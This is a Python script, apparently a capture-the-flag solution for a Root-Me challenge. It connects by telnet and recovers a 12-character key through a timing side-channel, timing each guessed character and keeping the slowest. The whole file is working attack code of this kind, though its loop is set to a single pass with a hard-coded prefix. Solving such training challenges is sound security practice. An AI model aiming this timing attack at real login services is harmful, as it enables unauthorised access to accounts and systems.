import telnetlib
from os.path import join
from statistics import mean

import time

ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
digits = '0123456789'
punctuation = r"""!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"""
printable = digits + ascii_lowercase + ascii_uppercase + punctuation
size_pass = 12
password = "30"

HOST = "challenge01.root-me.org"
port = 51015
time_array = []

tn = telnetlib.Telnet(HOST, port)
tn.read_until(b"Enter the 12 chars long key :")

for j in range(10, 9, -1):
    print(j)
    time_array[:] = []
    for i in range(0, len(printable)):
        password = password[0:12-j] + printable[i] * j
        start_time = time.time()
        tn.write(password.encode('ascii') + b"\n")
        output = tn.read_until(b"\nWrong key, try again")
        elapsed_time = time.time() - start_time
        if output != b"\nWrong key, try again":
            print("right password", password)
        time_array.append(elapsed_time)
        print(password, " ", elapsed_time)
    password = password[:12-j] + printable[time_array.index(max(time_array))]
    print("password", password)
    print("min", min(time_array))
    print("media", mean(time_array))
    print("max", max(time_array))


